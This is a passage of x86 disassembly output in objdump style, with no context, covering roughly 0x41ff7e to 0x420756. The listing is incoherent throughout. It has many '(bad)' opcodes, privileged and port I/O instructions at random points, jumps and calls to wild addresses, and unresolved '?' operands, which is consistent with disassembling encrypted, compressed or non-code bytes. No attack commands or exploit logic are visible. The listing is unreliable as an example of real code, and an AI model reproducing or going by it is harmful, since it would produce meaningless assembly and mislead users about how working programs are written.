  41ff7e:	stos   DWORD PTR es:[edi],eax
  41ff7f:	(bad)  [esp+eax*1]
  41ff82:	cmp    DWORD PTR [eax],ecx
  41ff84:	cmp    DWORD PTR [edx],ebp
  41ff86:	sti    
  41ff87:	nop
  41ff88:	xor    edx,DWORD PTR [esi+0x1234a4c5]
  41ff8e:	cmp    eax,0xdaf08774
  41ff93:	jmp    0xa3b228d0
  41ff98:	jnp    0x41ffe1
  41ff9a:	repz retf 0x624b
  41ff9e:	sbb    eax,0x7513e414
  41ffa3:	pop    ss
  41ffa4:	aas    
  41ffa5:	loope  0x41ffcb
  41ffa7:	or     ecx,DWORD PTR [esi+0x1a]
  41ffaa:	enter  0x2fa5,0x39
  41ffae:	jge    0x41ffb9
  41ffb0:	call   0xb35ca71a
  41ffb5:	fiadd  DWORD PTR [ecx-0x6f]
  41ffb8:	lock xchg edi,eax
  41ffba:	bound  esi,QWORD PTR [ecx+0x46d353b2]
  41ffc0:	in     eax,dx
  41ffc1:	imul   ebx,DWORD PTR [eax],0x28
  41ffc4:	int3   
  41ffc5:	cdq    
  41ffc6:	xchg   esi,eax
  41ffc7:	mov    ecx,DWORD PTR cs:[eax-0x6d]
  41ffcb:	daa    
  41ffcc:	add    DWORD PTR [edx-0x7a1a5e28],edi
  41ffd2:	mov    edi,0x4390d8ca
  41ffd7:	or     bl,BYTE PTR [eax-0x34bf5085]
  41ffdd:	shl    DWORD PTR [ecx+0x7b],0xdf
  41ffe1:	(bad)  
  41ffe3:	xchg   edx,eax
  41ffe4:	lods   al,BYTE PTR ds:[esi]
  41ffe5:	imul   ebp,edx,0x1b30dd81
  41ffeb:	jge    0x41ffa3
  41ffed:	xor    al,BYTE PTR [eax]
  41ffef:	(bad)  
  41fff1:	sub    eax,0xd1007d64
  41fff6:	inc    edi
  41fff7:	xchg   BYTE PTR ds:0x4c11e831,bl
  41fffd:	shr    DWORD PTR [ebx+0x78],cl
  420000:	lmsw   bx
  420003:	out    0x69,eax
  420005:	sar    dl,1
  420007:	lods   eax,DWORD PTR ds:[esi]
  420008:	repnz adc dl,ah
  42000b:	push   es
  42000c:	ins    DWORD PTR es:[edi],dx
  42000d:	mov    cs,WORD PTR [edx+eax*1+0x7d1a8d6b]
  420014:	cmp    al,0xd1
  420016:	xor    eax,0x5d943f44
  42001b:	cmp    dl,BYTE PTR [eax+0x10]
  42001e:	add    ecx,DWORD PTR [ebx]
  420020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420021:	mov    ebx,0xca7aa1bc
  420026:	and    eax,0x8bbbc990
  42002b:	or     BYTE PTR ds:0xe57149a8,cl
  420031:	dec    ecx
  420032:	inc    eax
  420033:	and    ebp,DWORD PTR [esi]
  420035:	mov    ds:0xd345dca2,eax
  42003a:	in     al,0x84
  42003c:	jb     0x420061
  42003e:	or     al,0x18
  420040:	pop    ebx
  420041:	add    cl,BYTE PTR [ebx]
  420043:	inc    edi
  420044:	into   
  420045:	push   cs
  420046:	xchg   esp,eax
  420047:	aam    0xeb
  420049:	push   ss
  42004a:	sar    DWORD PTR [eax],0x69
  42004d:	jge    0x41fff0
  42004f:	mov    edi,0x421dfa31
  420054:	mov    ah,0x9d
  420056:	mov    esp,0xcf15bd52
  42005b:	xor    BYTE PTR [ecx+0x5e],dl
  42005e:	sub    al,0x22
  420060:	ror    edx,0xae
  420063:	mov    ds:0x8767950b,al
  420068:	mov    bl,0x6f
  42006a:	(bad)  
  42006b:	out    0xab,eax
  42006d:	sub    BYTE PTR [esi+0x4],ah
  420070:	sub    al,0x16
  420072:	xchg   DWORD PTR [ebp-0x36],edi
  420075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420076:	xchg   esi,eax
  420077:	repnz shl DWORD PTR ds:[ecx],cl
  42007b:	cli    
  42007c:	dec    edx
  42007d:	pop    ss
  42007e:	aad    0x92
  420080:	aas    
  420081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420082:	lahf   
  420083:	inc    eax
  420084:	xor    dl,dl
  420086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420087:	repz int 0x1a
  42008a:	js     0x4200f1
  42008c:	jle    0x420057
  42008e:	gs pushf 
  420090:	pop    es
  420091:	and    esi,DWORD PTR [eax]
  420093:	jbe    0x4200cd
  420095:	jp     0x420052
  420097:	test   BYTE PTR [esi+0x5b],dl
  42009a:	mov    ch,0xcc
  42009c:	dec    esi
  42009d:	inc    esp
  42009e:	imul   ebx,DWORD PTR [esi],0xffffffa2
  4200a1:	ins    BYTE PTR es:[di],dx
  4200a3:	lock pusha 
  4200a5:	or     al,0xae
  4200a7:	fnstenv [edi+0x3fd85172]
  4200ad:	lock xor BYTE PTR [ebx+0x4e],0x75
  4200b2:	pop    esi
  4200b3:	xchg   DWORD PTR [esi-0x1eba05aa],esi
  4200b9:	inc    edi
  4200ba:	mov    eax,0x3a9c05b5
  4200bf:	cmp    ah,BYTE PTR ds:0x943b3722
  4200c5:	sbb    BYTE PTR [esi],0x62
  4200c8:	hlt    
  4200c9:	push   eax
  4200ca:	mov    eax,ds:0xbfc6c9a1
  4200cf:	cmp    esp,DWORD PTR [bx+si]
  4200d2:	addr16 out dx,eax
  4200d4:	ins    BYTE PTR es:[di],dx
  4200d6:	jmp    0x4200de
  4200d8:	mov    ch,0x1a
  4200da:	retf   
  4200db:	int    0x96
  4200dd:	sbb    esi,DWORD PTR ds:0x812f8ae
  4200e3:	stos   DWORD PTR es:[edi],eax
  4200e4:	sbb    BYTE PTR [ebx],0xe7
  4200e7:	ins    DWORD PTR es:[edi],dx
  4200e8:	pusha  
  4200e9:	dec    eax
  4200ea:	lds    ecx,FWORD PTR gs:[edi]
  4200ed:	inc    edi
  4200ee:	les    ecx,FWORD PTR [edx]
  4200f0:	xchg   edx,eax
  4200f1:	stos   BYTE PTR es:[edi],al
  4200f2:	enter  0x751,0x9b
  4200f6:	push   ebp
  4200f7:	sub    bl,bl
  4200f9:	and    DWORD PTR [edx-0x35ff64e8],edi
  4200ff:	pop    esp
  420100:	and    BYTE PTR [esi+0x3b58e779],0xe4
  420107:	pop    ds
  420108:	xchg   edi,eax
  420109:	retf   0xb2a9
  42010c:	lods   eax,DWORD PTR ds:[esi]
  42010d:	aaa    
  42010e:	and    BYTE PTR [esi+0x51],ah
  420111:	mov    dl,0x68
  420113:	je     0x420112
  420115:	dec    ebp
  420116:	ror    BYTE PTR [eax-0x33752381],1
  42011c:	pop    ebp
  42011d:	mov    eax,0xe4390d65
  420122:	jbe    0x420135
  420124:	bound  ebp,QWORD PTR [eax]
  420126:	sbb    edx,DWORD PTR [esi-0x3f6e3053]
  42012c:	sub    DWORD PTR [ebx-0x257e1d7d],edi
  420132:	mov    ecx,0xfaae3b93
  420137:	shl    ecx,0x1c
  42013a:	mov    dl,0xc4
  42013c:	in     al,dx
  42013d:	inc    eax
  42013e:	(bad)  
  42013f:	jge    0x420144
  420141:	stos   DWORD PTR es:[edi],eax
  420142:	add    eax,0xb5dc0801
  420147:	sub    eax,DWORD PTR [edi-0xd]
  42014a:	add    al,BYTE PTR [edx-0x66909ebb]
  420150:	bound  eax,QWORD PTR [ebp-0x15023531]
  420156:	popf   
  420157:	pop    ebx
  420158:	mov    DWORD PTR [ebx+ebp*1-0x42],ebx
  42015c:	pop    DWORD PTR [edi+0x42]
  42015f:	jbe    0x4201cb
  420161:	push   ebp
  420162:	mov    ds:0xd9e91fe9,al
  420167:	imul   ecx,DWORD PTR [eax],0x38
  42016a:	and    DWORD PTR [edi],0xd50b4cd2
  420170:	scas   al,BYTE PTR es:[edi]
  420171:	mov    al,ds:0x4e8336b
  420176:	rcl    cl,cl
  420178:	xor    esi,DWORD PTR [ebp+0x68]
  42017b:	push   ds
  42017c:	mov    al,BYTE PTR [ecx-0x3b]
  42017f:	push   ebx
  420181:	iret   
  420182:	jl     0x4201b7
  420184:	add    dl,BYTE PTR ds:0xcdd74d00
  42018a:	adc    ecx,edi
  42018c:	(bad)  
  42018e:	lock dec esp
  420190:	int    0xd6
  420192:	dec    ebx
  420193:	and    eax,0x4791611a
  420198:	adc    BYTE PTR [esi],bh
  42019a:	imul   eax,ecx,0x397e12e8
  4201a0:	mov    ebp,0xeff0127e
  4201a5:	push   ss
  4201a6:	pslld  mm5,QWORD PTR [ebp+0x19da3f4]
  4201ad:	inc    esi
  4201ae:	cmp    eax,0x97f00e3
  4201b3:	(bad)  
  4201b4:	fwait
  4201b5:	add    ah,BYTE PTR [ebp+0x6e6c50d3]
  4201bb:	cmp    DWORD PTR [ebp+0x31],esi
  4201be:	inc    edx
  4201bf:	scas   al,BYTE PTR es:[edi]
  4201c0:	push   esi
  4201c1:	mov    ebx,0x9ba66034
  4201c6:	dec    eax
  4201c7:	pop    ecx
  4201c8:	mov    eax,0xf09d04f8
  4201cd:	lods   eax,DWORD PTR ds:[si]
  4201cf:	hlt    
  4201d0:	sbb    BYTE PTR [edx-0x8],bl
  4201d3:	and    DWORD PTR [ebp-0x6c],ecx
  4201d6:	fdiv   QWORD PTR ds:0x1e5ba5bf
  4201dc:	mov    BYTE PTR [ecx-0x52f8207d],cl
  4201e2:	in     al,dx
  4201e3:	pop    ss
  4201e4:	sbb    BYTE PTR [eax-0xf],ah
  4201e7:	mov    bl,0x37
  4201e9:	jbe    0x420238
  4201eb:	pop    edx
  4201ec:	xor    al,0xd0
  4201ee:	inc    eax
  4201ef:	sub    ebx,eax
  4201f1:	ss out 0xc5,al
  4201f4:	fbld   TBYTE PTR ds:0xa135e3d8
  4201fa:	fdiv   DWORD PTR [edi+ebx*1+0x2c]
  4201fe:	rcl    DWORD PTR [esi+0x11],cl
  420201:	push   edi
  420202:	cmp    BYTE PTR [edi-0x3df94f6c],ah
  420208:	aas    
  420209:	inc    esp
  42020a:	xchg   ecx,eax
  42020b:	sub    al,BYTE PTR [edx+0x2786e526]
  420211:	scas   al,BYTE PTR es:[edi]
  420212:	adc    edi,0xffffffb7
  420215:	mov    esp,DWORD PTR [esi+eax*4-0x1b]
  420219:	xchg   edx,eax
  42021a:	push   esi
  42021b:	mov    ?,WORD PTR [edx-0xf]
  42021e:	retf   
  42021f:	fmul   QWORD PTR [esi+0x6fa77ad0]
  420225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420226:	js     0x420228
  420228:	add    BYTE PTR [edi+edx*2+0x48851bf4],ch
  42022f:	shl    esi,1
  420231:	push   0x8840f3fc
  420236:	or     ecx,ebx
  420238:	js     0x42025c
  42023a:	test   al,0xe1
  42023c:	or     BYTE PTR [ebx],bh
  42023e:	popf   
  42023f:	push   ss
  420240:	dec    eax
  420241:	and    al,BYTE PTR [esi-0x5a]
  420244:	push   ebp
  420245:	mov    ?,WORD PTR [edi+0x53]
  420248:	sbb    BYTE PTR [ebx],dl
  42024a:	out    0x4,al
  42024c:	retf   0x58ed
  42024f:	sub    bh,cl
  420251:	mov    WORD PTR ds:0x8f8c4cdd,?
  420257:	push   esp
  420258:	enter  0xb623,0x68
  42025c:	lds    esi,FWORD PTR [ecx-0x41]
  42025f:	imul   esp,DWORD PTR [ebx+ecx*8+0x74],0x67
  420264:	in     eax,0x5b
  420266:	pop    edi
  420267:	outs   dx,DWORD PTR ds:[esi]
  420268:	add    BYTE PTR [eax+0x20f96f20],cl
  42026e:	cmc    
  42026f:	inc    eax
  420270:	push   ebp
  420271:	repnz dec ecx
  420273:	fistp  QWORD PTR [ecx-0x52]
  420276:	push   0xfea0baa
  42027b:	lock mov BYTE PTR [eax],cl
  42027e:	push   ebx
  42027f:	fnstenv [ebx-0x6d]
  420282:	sub    bh,BYTE PTR [ecx+ebx*2-0x392d1c37]
  420289:	popa   
  42028a:	add    ebp,DWORD PTR [ebp-0x17030b9b]
  420290:	pop    ebx
  420291:	outs   dx,BYTE PTR ds:[esi]
  420292:	jns    0x4202d9
  420294:	aad    0x1d
  420296:	iret   
  420297:	in     al,0x97
  420299:	nop
  42029a:	push   ss
  42029b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42029c:	pop    esi
  42029d:	fs (bad) 
  42029f:	mov    ds:0x790e7667,al
  4202a4:	mov    ah,BYTE PTR [esi-0x19]
  4202a7:	push   eax
  4202a8:	inc    esp
  4202a9:	mov    ebp,ebx
  4202ab:	stc    
  4202ac:	mov    esp,0xa39a337c
  4202b1:	jns    0x4202ec
  4202b3:	or     eax,0xcfc433b0
  4202b8:	and    ax,WORD PTR [ecx+0x7a27d80c]
  4202bf:	pop    edx
  4202c0:	xor    cl,BYTE PTR [esi+0x2e]
  4202c3:	cmp    eax,0x989ff5d1
  4202c8:	or     edi,DWORD PTR [edi+0x7e]
  4202cb:	fnsave [esi]
  4202cd:	(bad)  
  4202ce:	sar    ecx,1
  4202d0:	ja     0x42031d
  4202d2:	aad    0x24
  4202d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202d5:	cwde   
  4202d6:	int    0x83
  4202d8:	scas   al,BYTE PTR es:[edi]
  4202d9:	push   cs
  4202da:	cwde   
  4202db:	mov    si,0x75ee
  4202df:	imul   ebx,DWORD PTR [esi],0x4f2d95d7
  4202e5:	push   ds
  4202e6:	aam    0x5d
  4202e8:	call   0x9ac6:0x74bf3aa1
  4202ef:	das    
  4202f0:	lahf   
  4202f1:	imul   esp,DWORD PTR [ebx-0x498005a8],0x7fee9b9c
  4202fb:	sub    BYTE PTR [ecx-0x39],cl
  4202fe:	(bad)  
  4202ff:	jo     0x420283
  420301:	or     eax,0x4dd46f61
  420306:	repz cmp DWORD PTR [ebx-0x53325efa],ebx
  42030d:	mov    eax,0x334d7236
  420312:	and    BYTE PTR [eax],0x66
  420315:	push   ecx
  420316:	push   edx
  420317:	dec    edi
  420318:	adc    dh,BYTE PTR [edi-0x3f]
  42031b:	sar    BYTE PTR ds:0x13955a80,0x45
  420322:	sbb    DWORD PTR [esi],esi
  420324:	jnp    0x4202e9
  420326:	sahf   
  420327:	xchg   edx,eax
  420328:	dec    edi
  420329:	(bad)  
  42032a:	cmp    esp,ebp
  42032c:	call   0xcbaa474f
  420331:	jb     0x4202f6
  420333:	stos   DWORD PTR es:[edi],eax
  420334:	scas   al,BYTE PTR es:[edi]
  420335:	dec    esi
  420336:	or     al,BYTE PTR [ecx]
  420338:	test   al,0x84
  42033a:	leave  
  42033b:	inc    ebx
  42033c:	pop    esi
  42033d:	cmp    DWORD PTR [ecx],0xffffffb9
  420340:	xor    eax,0x7ceab30
  420345:	adc    eax,0x80ed0389
  42034a:	jp     0x420392
  42034c:	mov    es,WORD PTR [ebx+ebx*2-0x7efbf9eb]
  420353:	dec    edi
  420354:	sub    dl,BYTE PTR [eax-0x6b]
  420357:	test   al,0xd5
  420359:	push   ecx
  42035a:	adc    esp,DWORD PTR [ebx-0x50]
  42035d:	push   ecx
  42035e:	(bad)  
  42035f:	xor    al,0x23
  420361:	push   edi
  420362:	lahf   
  420363:	ja     0x42033a
  420365:	das    
  420366:	fcmovne st,st(6)
  420368:	int3   
  420369:	sti    
  42036a:	push   es
  42036b:	mov    dl,0xdf
  42036d:	push   ebp
  42036e:	(bad)  
  42036f:	shr    DWORD PTR [edi],cl
  420371:	mov    al,0x9a
  420373:	fs inc esp
  420375:	push   eax
  420376:	pop    eax
  420377:	and    ebp,DWORD PTR [ecx-0x6a18e8fc]
  42037d:	mov    esp,0xbe72ab4b
  420382:	fidivr DWORD PTR [edx+0x0]
  420385:	idiv   DWORD PTR [ecx+0x6ecba4c4]
  42038b:	icebp  
  42038c:	test   BYTE PTR [edx+0x57],bh
  42038f:	jno    0x4203c0
  420391:	pop    ds
  420392:	lea    ebx,[esp+ebx*4+0x26]
  420396:	stc    
  420397:	pusha  
  420398:	sar    BYTE PTR [ecx],cl
  42039a:	aas    
  42039b:	sbb    eax,0xb1d52739
  4203a0:	out    0xeb,al
  4203a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203a3:	mov    al,ds:0x2eab6919
  4203a8:	test   DWORD PTR [eax],0x77c9c721
  4203ae:	sub    eax,0xb7c98d4e
  4203b3:	mov    esp,0x9298c9d3
  4203b8:	lahf   
  4203b9:	xor    ch,BYTE PTR [ecx-0x2c]
  4203bc:	mov    ebx,0x6564f222
  4203c1:	push   ebx
  4203c2:	mov    ds:0x53961ab1,eax
  4203c7:	and    eax,0x427a6dd8
  4203cc:	dec    ebp
  4203cd:	jp     0x42043e
  4203cf:	xlat   BYTE PTR ds:[ebx]
  4203d0:	int3   
  4203d1:	inc    ecx
  4203d2:	cli    
  4203d3:	fdiv   DWORD PTR [ecx]
  4203d5:	ins    BYTE PTR es:[edi],dx
  4203d6:	lock add DWORD PTR [ebx],esi
  4203d9:	call   0x18116eae
  4203de:	ror    BYTE PTR [edi-0x9],cl
  4203e1:	pop    eax
  4203e2:	pusha  
  4203e3:	cmp    ebx,DWORD PTR [edx-0x1e]
  4203e6:	idiv   BYTE PTR [esi-0x2b]
  4203e9:	fs jecxz 0x42044e
  4203ec:	xchg   DWORD PTR [ecx+ebp*8-0x39],edx
  4203f0:	or     eax,0x1173ce0c
  4203f5:	pop    esi
  4203f6:	mov    al,0x9e
  4203f8:	int3   
  4203f9:	outs   dx,DWORD PTR ss:[esi]
  4203fb:	and    ecx,DWORD PTR [eax-0x62]
  4203fe:	fbld   TBYTE PTR [edx]
  420400:	imul   BYTE PTR [eax-0x6a]
  420403:	or     ch,BYTE PTR [eax]
  420405:	mov    esp,0xb1ea88be
  42040a:	mov    edi,0x21070da8
  42040f:	aaa    
  420410:	sub    eax,0xbbcd133c
  420415:	(bad)  
  420416:	sbb    dl,BYTE PTR ss:[eax]
  420419:	add    cl,BYTE PTR [ebx+0x6ff86a39]
  42041f:	pop    eax
  420420:	sahf   
  420421:	sub    DWORD PTR [edi-0x6cd85ab3],0xffffffd0
  420428:	aaa    
  420429:	cmp    eax,0xa49f61fd
  42042e:	dec    dx
  420430:	retf   
  420431:	mov    dh,0x5d
  420433:	int3   
  420434:	push   0xee9ca6a4
  420439:	adc    BYTE PTR [ebx],0x31
  42043c:	mov    dh,0x7a
  42043e:	and    al,0xe2
  420440:	adc    eax,DWORD PTR [esi]
  420442:	jae    0x420426
  420444:	into   
  420445:	out    0xe6,al
  420447:	cmp    DWORD PTR [edi-0x20],ebp
  42044a:	out    0xf2,eax
  42044c:	adc    al,0x32
  42044e:	dec    WORD PTR [edx]
  420451:	shr    eax,0x8
  420454:	fcomp  DWORD PTR [ebp-0x30]
  420457:	cmp    eax,DWORD PTR ds:0xe96c330d
  42045d:	cmp    BYTE PTR [eax-0x7c],bh
  420460:	jbe    0x420414
  420462:	or     al,0x6f
  420464:	adc    BYTE PTR ds:0x9035c42a,0x74
  42046b:	push   ecx
  42046c:	mov    DWORD PTR [edx-0x44],esi
  42046f:	xor    BYTE PTR [ebp*1-0x390f50fc],bh
  420476:	jp     0x420428
  420478:	sar    BYTE PTR [esi-0x55],0xb8
  42047c:	call   edx
  42047e:	fdivr  DWORD PTR [esi+0x21b7b5f8]
  420484:	push   esp
  420485:	add    al,0x6d
  420487:	in     al,0x93
  420489:	add    eax,0x38b46f60
  42048e:	js     0x420469
  420490:	or     eax,0xa6871c81
  420495:	dec    eax
  420496:	xchg   ebx,eax
  420497:	imul   eax,DWORD PTR [esi-0x11],0xffffffeb
  42049b:	fstp   DWORD PTR [esi-0x1f]
  42049e:	ins    DWORD PTR es:[edi],dx
  42049f:	scas   eax,DWORD PTR es:[edi]
  4204a0:	mov    ah,0xb3
  4204a2:	inc    ebp
  4204a3:	adc    BYTE PTR [ecx-0x73],dl
  4204a6:	inc    eax
  4204a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204a8:	cmp    al,0x6e
  4204aa:	es cmp al,0xa6
  4204ad:	pop    ecx
  4204ae:	in     eax,dx
  4204af:	or     al,0x8
  4204b1:	stos   DWORD PTR es:[edi],eax
  4204b2:	mov    ebp,0x4233c289
  4204b7:	fstp   st(3)
  4204b9:	daa    
  4204ba:	or     BYTE PTR [esi+0x1f9f89bc],dh
  4204c0:	in     al,0xbc
  4204c2:	jecxz  0x4204a0
  4204c4:	or     DWORD PTR [edx-0x18],ebx
  4204c7:	call   0x9ca21c41
  4204cc:	(bad)  
  4204cd:	je     0x420490
  4204cf:	add    edi,DWORD PTR [esi-0x17c41e87]
  4204d5:	adc    eax,0x7d99972f
  4204da:	cmp    BYTE PTR [edi-0x74eb4301],dh
  4204e0:	js     0x420473
  4204e2:	dec    ecx
  4204e3:	cmc    
  4204e4:	xchg   esp,eax
  4204e5:	pop    esp
  4204e6:	(bad)  
  4204e7:	jg     0x4204d0
  4204e9:	xchg   edi,eax
  4204ea:	pop    es
  4204eb:	jns    0x4204de
  4204ed:	(bad)  
  4204ee:	push   cs
  4204ef:	dec    edi
  4204f0:	add    DWORD PTR [ebp-0x34884797],ecx
  4204f6:	sti    
  4204f7:	pop    ds
  4204f8:	lahf   
  4204f9:	pop    ebx
  4204fa:	scas   al,BYTE PTR es:[edi]
  4204fb:	mov    ds:0xdf9b043d,eax
  420500:	nop
  420501:	xchg   BYTE PTR [eax],dl
  420503:	hlt    
  420504:	inc    esi
  420505:	int3   
  420506:	or     al,0x8f
  420508:	out    dx,al
  420509:	lea    ebx,[ebp-0x2e]
  42050c:	(bad)  
  42050d:	dec    edi
  42050e:	das    
  42050f:	mov    al,0x1d
  420511:	mov    edx,0x667ed11e
  420516:	je     0x4204fe
  420518:	fcomp  DWORD PTR [ebp-0x296a6347]
  42051e:	lea    ebp,[ecx]
  420520:	sub    eax,0xb576d460
  420525:	iret   
  420526:	stc    
  420527:	fcomp  DWORD PTR [esi+0x32]
  42052a:	dec    edx
  42052b:	cld    
  42052c:	adc    eax,0x712b7c93
  420531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420532:	pushf  
  420533:	jmp    0x1eb27af4
  420538:	push   DWORD PTR [esi]
  42053a:	retf   0x4699
  42053d:	sbb    cl,BYTE PTR [ecx]
  42053f:	xor    eax,0xbf0417a5
  420544:	and    al,0x58
  420546:	test   al,0x52
  420548:	adc    edi,DWORD PTR [edi]
  42054a:	cmp    ebp,DWORD PTR [edi+0x25]
  42054d:	inc    eax
  42054e:	or     eax,0x8477871a
  420553:	int    0x24
  420555:	(bad)  
  420556:	cli    
  420557:	pop    edx
  420558:	cmp    eax,0x73992322
  42055d:	rol    dh,cl
  42055f:	mov    ecx,0x27f9b903
  420564:	pop    edi
  420565:	sbb    edi,DWORD PTR [eax]
  420567:	xchg   ebp,eax
  420568:	scas   eax,DWORD PTR es:[edi]
  420569:	mov    edx,0x7d2bd15c
  42056e:	mov    ebx,0x9baf09f3
  420573:	mov    ds:0x465f899f,al
  420578:	jmp    0xe11f9730
  42057d:	mov    esp,0x7f708744
  420582:	repz call 0x82e5:0x92dc5d5e
  42058a:	push   edx
  42058b:	fwait
  42058c:	imul   edx,DWORD PTR [eax-0x1e],0x62
  420590:	test   eax,0x8f17d84f
  420595:	lahf   
  420596:	imul   ebx,DWORD PTR [esi],0xffffffa5
  420599:	fwait
  42059a:	pop    edi
  42059b:	jge    0x420600
  42059d:	jo     0x42057f
  42059f:	mov    dl,0xe5
  4205a1:	jnp    0x420583
  4205a3:	aad    0x3
  4205a5:	lds    edx,FWORD PTR [ebx]
  4205a7:	xchg   ebp,eax
  4205a8:	mov    es:0x9c91588f,al
  4205ae:	clc    
  4205af:	ins    BYTE PTR es:[edi],dx
  4205b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205b1:	jl     0x42062f
  4205b3:	cmc    
  4205b4:	aam    0xc5
  4205b6:	aam    0x97
  4205b8:	push   edx
  4205b9:	and    DWORD PTR [ebx],ecx
  4205bb:	(bad)  
  4205bd:	sbb    al,0xa0
  4205bf:	mov    edx,0x288c773e
  4205c4:	jmp    0xa18d260a
  4205c9:	aam    0xe5
  4205cb:	inc    eax
  4205cc:	mov    ds:0x214846f1,al
  4205d1:	mov    DWORD PTR [esi-0x54],esp
  4205d4:	jne    0x420639
  4205d6:	sub    eax,0x5f6f326f
  4205db:	(bad)  
  4205dc:	es add cl,dh
  4205df:	jmp    0xf59e55a1
  4205e4:	cmp    DWORD PTR ds:0x743cc754,0x51
  4205eb:	std    
  4205ec:	dec    edx
  4205ed:	and    bh,bl
  4205ef:	out    dx,al
  4205f0:	and    edi,edx
  4205f2:	inc    edi
  4205f3:	mov    esp,0x3a54db73
  4205f8:	cmp    al,0xe2
  4205fa:	stc    
  4205fb:	cld    
  4205fc:	mov    edx,DWORD PTR ds:[edi+0x292a0c4f]
  420603:	aas    
  420604:	(bad)  
  420605:	jnp    0x4205e0
  420607:	leave  
  420608:	mov    bh,0x62
  42060a:	jno    0x420673
  42060c:	adc    al,0xcc
  42060e:	xlat   BYTE PTR ds:[ebx]
  42060f:	fild   QWORD PTR [edi+0xb]
  420613:	mov    dh,0x86
  420615:	out    0x1d,eax
  420617:	shl    dl,1
  420619:	xchg   DWORD PTR [ebp+0x8],ebx
  42061c:	dec    ebx
  42061d:	ja     0x420610
  42061f:	push   esi
  420620:	push   es
  420621:	jo     0x42068a
  420623:	mov    BYTE PTR [esp+ebp*1+0x4c],bl
  420627:	imul   esi,ecx,0x18dd9fa8
  42062d:	nop
  42062e:	sbb    al,BYTE PTR [eax+eax*2-0x6e]
  420632:	pop    ss
  420633:	and    eax,0xe554282d
  420638:	push   eax
  420639:	icebp  
  42063a:	sti    
  42063b:	sbb    dh,dh
  42063d:	sub    ah,dl
  42063f:	push   ebx
  420640:	xor    dh,BYTE PTR [esi-0x9]
  420643:	clc    
  420644:	jecxz  0x4205e6
  420646:	jge    0x4206a3
  420648:	bnd ret 
  42064a:	sub    bh,al
  42064c:	mov    ebx,0x28569cc1
  420651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420652:	(bad)  
  420654:	cmp    dl,bh
  420656:	fwait
  420657:	gs sahf 
  420659:	mov    edi,0x2e3df5f7
  42065e:	stos   BYTE PTR es:[edi],al
  42065f:	pop    eax
  420660:	mov    dl,0xdd
  420662:	dec    ecx
  420663:	adc    BYTE PTR [esi+0x1d8723a1],bh
  420669:	loope  0x420656
  42066b:	iret   
  42066c:	std    
  42066d:	jmp    esi
  42066f:	leave  
  420670:	push   esi
  420671:	outs   dx,BYTE PTR ds:[esi]
  420672:	lods   eax,DWORD PTR ds:[esi]
  420673:	cmp    dh,0xa4
  420676:	mov    DWORD PTR [eax],eax
  420678:	jmp    0x12b3b1f1
  42067d:	cmp    DWORD PTR [edx+0x209e9670],0x5a
  420684:	out    dx,eax
  420685:	push   ebx
  420686:	mov    dh,0xd4
  420688:	mov    al,ds:0x97dffbe
  42068d:	inc    esp
  42068e:	cs jno 0x4206d5
  420691:	or     BYTE PTR ds:0xd629505a,0x6f
  420698:	stos   DWORD PTR es:[edi],eax
  420699:	out    dx,eax
  42069a:	out    0x23,al
  42069c:	or     al,BYTE PTR [edx]
  42069e:	icebp  
  42069f:	mov    ds:0xa6c45d41,al
  4206a4:	xchg   esp,eax
  4206a5:	aaa    
  4206a6:	test   eax,0x2b5bb5a0
  4206ab:	retfw  
  4206ad:	adc    eax,DWORD PTR [edx+0x6f50b535]
  4206b3:	aam    0xd9
  4206b5:	mov    eax,0x9e4ef31c
  4206ba:	jno    0x420643
  4206bc:	jle    0x42073c
  4206be:	jae    0x420692
  4206c0:	(bad)  
  4206c1:	js     0x4206ff
  4206c3:	jp     0x420685
  4206c5:	loop   0x4206f4
  4206c7:	jns    0x420734
  4206c9:	mov    bh,0x68
  4206cb:	rol    DWORD PTR fs:[eax-0x5e],1
  4206cf:	dec    eax
  4206d0:	mov    WORD PTR [edx],es
  4206d2:	pop    eax
  4206d3:	fisttp QWORD PTR [edx+0x51]
  4206d6:	test   BYTE PTR [ebp-0x471e650f],bl
  4206dc:	sbb    eax,0xcbd35d89
  4206e1:	sbb    dl,bl
  4206e3:	mov    dh,BYTE PTR [edi+0x11]
  4206e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206e7:	jno    0x4206e0
  4206e9:	cld    
  4206ea:	pop    ebp
  4206eb:	sahf   
  4206ec:	mov    cl,ah
  4206ee:	fs icebp 
  4206f0:	inc    edx
  4206f1:	mov    esi,0x3a05a7d6
  4206f6:	xchg   edi,eax
  4206f7:	mov    dh,0xdf
  4206f9:	imul   ebx,DWORD PTR ds:0x731fd805,0x8
  420700:	fdiv   DWORD PTR [eiz*4+0x4b703adb]
  420707:	jns    0x4206e8
  420709:	jns    0x42075b
  42070b:	cli    
  42070c:	pop    ss
  42070d:	push   es
  42070e:	mov    ds,WORD PTR [edi-0x4]
  420711:	jnp    0x42071d
  420713:	into   
  420714:	rol    DWORD PTR [ebp+0x7243c79f],cl
  42071a:	push   esi
  42071b:	xor    edi,edi
  42071d:	mov    eax,ds:0xfef62437
  420722:	int    0x9d
  420724:	xchg   ebp,eax
  420725:	aas    
  420726:	daa    
  420727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420728:	and    bh,BYTE PTR [ecx+0xb09d033]
  42072e:	in     eax,0x98
  420730:	xor    eax,0x37a2819b
  420735:	retf   
  420736:	sub    bl,BYTE PTR [esi+0x3]
  420739:	and    ecx,esi
  42073b:	(bad)  
  42073c:	xor    dl,al
  42073e:	dec    esi
  42073f:	pop    edi
  420740:	or     eax,0xbe710d07
  420745:	push   cs
  420746:	stos   BYTE PTR es:[edi],al
  420747:	jge    0x420770
  420749:	jnp    0x420768
  42074b:	xor    DWORD PTR [edi-0x54],edi
  42074e:	in     eax,dx
  42074f:	add    DWORD PTR ds:0x1b1c9b5f,0xffffffa4
  420756:	mov    ebp,0x64bdca29
